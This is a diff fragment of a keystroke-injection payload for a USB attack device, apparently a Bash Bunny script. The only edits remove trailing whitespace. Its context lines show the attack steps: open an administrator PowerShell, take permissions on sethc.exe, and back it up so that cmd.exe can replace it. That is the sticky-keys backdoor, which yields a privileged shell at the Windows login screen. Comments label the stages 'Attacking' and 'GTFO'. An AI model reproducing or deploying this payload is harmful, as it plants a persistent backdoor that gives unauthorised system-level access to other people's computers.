@@ -11,7 +11,7 @@
 # Yellow.............Attacking
 # Green..............GTFO
 
-#Open Admin Powershell 
+#Open Admin Powershell
 ATTACKMODE HID
 LED B 200
 Q GUI
@@ -26,7 +26,7 @@ Q ENTER
 Q DELAY 1200
 
 #Give Permissions for sethc.exe to current user
-LED Y 500 
+LED Y 500
 Q STRING "\$Acl = Get-Acl sethc.exe"
 Q ENTER
 Q DELAY 100
@@ -42,7 +42,7 @@ Q DELAY 100
 
 #Copy over CMD to SETHC.EXE (Save sethc.exe as sethc.exe.bak if you want to be nice)
 Q STRING "xcopy sethc.exe sethc.exe.bak"
-Q ENTER 
+Q ENTER
 Q DELAY 1200
 Q STRING "F"
 Q DELAY 100
